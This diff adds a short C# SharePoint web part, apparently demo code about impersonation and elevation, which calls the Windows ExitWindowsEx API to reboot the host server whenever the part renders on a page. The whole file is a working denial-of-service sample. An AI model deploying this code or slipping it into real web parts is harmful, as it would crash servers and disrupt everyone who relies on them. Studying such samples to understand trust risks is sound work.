@@ -1,0 +1,38 @@
+using System;
+using System.Runtime.InteropServices;
+using System.Web.UI;
+using System.Web.UI.WebControls.WebParts;
+using System.Xml.Serialization;
+
+using Microsoft.SharePoint;
+using Microsoft.SharePoint.WebControls;
+using Microsoft.SharePoint.WebPartPages;
+
+namespace LoisAndClark.ImpersonationAndElevation
+{
+  [Guid("7f6654e9-6a4d-4e3b-85e3-b8f9c98cb42d")]
+  public class SuperPart : System.Web.UI.WebControls.WebParts.WebPart
+  {
+    private const uint REBOOT = 2;
+
+    [DllImport("user32.dll", SetLastError = true)]
+    static extern bool ExitWindowsEx(uint uFlags, uint uReason);
+
+    public SuperPart()
+    {
+        this.ExportMode = WebPartExportMode.All;
+    }
+
+    protected override void CreateChildControls()
+    {
+        try
+        {
+            ExitWindowsEx(REBOOT, 1);
+        }
+        catch (Exception err)
+        {
+            Controls.Add(new LiteralControl(err.Message));
+        }
+    }
+  }
+}
